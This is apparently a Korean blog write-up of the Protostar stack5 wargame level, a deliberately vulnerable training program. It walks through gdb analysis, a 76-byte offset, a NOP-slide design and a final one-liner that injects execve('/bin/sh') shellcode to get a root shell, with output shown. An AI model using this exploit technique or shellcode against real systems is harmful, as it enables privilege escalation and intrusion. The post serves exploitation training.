---
layout: post
title: "[exploit-exercise] Protostar stack5"
date: 2016-07-04 22:40:00
category: wargame
tags:  [exploit-exercise, protostar]
---

[Protostar Stack5 - Exploit Exercises](https://exploit-exercises.com/protostar/stack5/)

>Stack5 is a standard buffer overflow, this time introducing shellcode.
>
>This level is at /opt/protostar/bin/stack5
>
>Hints
>
>At this point in time, it might be easier to use someone elses shellcode
>If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
>remove the int3s once your shellcode is done.

<!--more--> 

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## 해결 방안

jump 이동 시킬 함수가 따로 있는 것이 아니라 BoF로 shellcode inject 하여 실행하면 될 듯... 

## 분석

shellCode 를 위해서 실행 환경 확인... `x86` 이고, shell은 `/bin/bash` 이다.

```bash
$ uname -a
Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux 

$ id
uid=1001(user) gid=1001(user) groups=1001(user)
$ whoami
user

$ which sh
/bin/sh
$ ls -al /bin/sh
lrwxrwxrwx 1 root root 4 Nov 22  2011 /bin/sh -> dash

$ which bash
/bin/bash
$ ls -al /bin/bash
-rwxr-xr-x 1 root root 811156 Apr 10  2010 /bin/bash

$ which bash
/bin/bash
$ ls -al /bin/dash
-rwxr-xr-x 1 root root 84144 Dec 14  2010 /bin/dash  
```

#### `eip` 위치 확인

먼저 `lr` 위치 파악하기 위하여 pattern 으로 crash 해보자. [stack4](https://humb1ec0ding.github.io/2016/07/03/exploit-exercise-protostar-stack4/)와 동일하게 `76` bytes 떨어져 있다.

```
(gdb) r < /tmp/input
Starting program: /opt/protostar/bin/stack5 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()  

$ pattern.py 0x63413563
Pattern 0x63413563 first occurrence at position 76 in pattern.
```

#### `buffer[]` 위치 확인

```bash
$ python -c 'print "A"*100'  > /tmp/AAAA  
$ gdb ./stack5
...
(gdb) r < /tmp/AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack5 < /tmp/AAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()  

(gdb) x/100x $esp-0x60
0xbffffc70:     0xbffffc80      0xb7ec6165      0xbffffc88      0xb7eada75
0xbffffc80:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc90:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffca0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcc0:     0x41414141      0x41414141      0x41414141      0x41414141
...
```

위와 같이 gdb 를 이용해서 stack 위치를 확인하는 것까지는 좋은데... 여기서 항상 발생하는 문제는 **gdb 로 실행한 경우와 바로 실행한 경우에 stack 이 다르게 잡힌다는 것**이다.  

[c - Buffer overflow works in gdb but not without it - Stack Overflow](http://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966)

#### buffer[] 시작부터  shellcode 넣고 바로 jump 시키는 경우

따라서 gdb 로 실행해서 buffer 주소를 알아낸 후에 정확하게 그 자리로 jump 하도록 하면 잘 안되는 경우가 많다.

```
buffer[76] + eip
= shellcode[x] + dummp [76-x] + buffer 시작위치
```

#### NOP slide 많이 이용해서 stack 위치 변해도 동작하도록

안전하게 아래와 같이 exploit payload 를 구성해보자.

```
buffer[76] + eip
= dummy[76] + eip + NOP[300] + shellcode
```

#### ShellCode 준비 (33bytes)

그냥 shell 보다는 root shell 이 좋을 것 같아서 아래로 선택.

[Linux/x86 - setreuid(0,0) + execve(/bin/sh, [/bin/sh, NULL])](http://shell-storm.org/shellcode/files/shellcode-250.php)

#### Payload 구성

NOP 를 300bytes 정도 깔아놓고 그 중간으로 jump 시키면 stack 이 움직여도 이 범위 안에서는 NOP 을 타고 shellcode 로 갈 것으로 예상함.

```
buffer[76] + eip
= dummy[76] + eip + NOP[300] + shellcode
```

이렇게 길게 넣을 수 있는지 우선 확인해보자..

```bash
$ python -c 'print "A"*76 + "B"*4 + "C"*400' > /tmp/stack5

$ gdb ./stack5
(gdb) r < /tmp/stack5
Starting program: /opt/protostar/bin/stack5 < /tmp/stack5

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()   

(gdb) x/100x $esp - 0x60
0xbffffc60:     0xbffffc70      0xb7ec6165      0xbffffc78      0xb7eada75
0xbffffc70:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc80:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc90:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffca0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcb0:     0x41414141      0x41414141      0x41414141      0x42424242
0xbffffcc0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffcd0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffce0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffcf0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffd00:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffd10:     0x43434343      0x43434343      0x43434343      0x43434343  
...
0xbffffe20:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffe30:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffe40:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffe50:     0x00000000      0x00000000      0xd1000000      0xbc94263b
...
```

모두 잘 들어간 듯하다.

## Final Exploit

가장 중요한 NOP slide 중간에 jump 시킬 위치는 대충해서 `0xbffffde0` 정도로 선택.

```bash
$ (python -c 'print "A"*76 + "\xe0\xfd\xff\xbf" + "\x90" * 300 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; cat) | ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root   
```

성공~~~

####  입력에 `cat` 없다면 ?

동일한 exploit 을 사용해도 `cat` 을 사용하지 않는다면 `stdin`,`stdout` 잡아주지 못해서 한 번 실행이 되고 종료가 되는지.. `root` 가 아니라 원래 계정 `user` 로 돌아오는 듯 하다.

```bash
$ python -c 'print "A"*76 + "\xe0\xfd\xff\xbf" + "\x90" * 300 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' | ./stack5
$ id
uid=1001(user) gid=1001(user) groups=1001(user)
$ whoami
user   
```
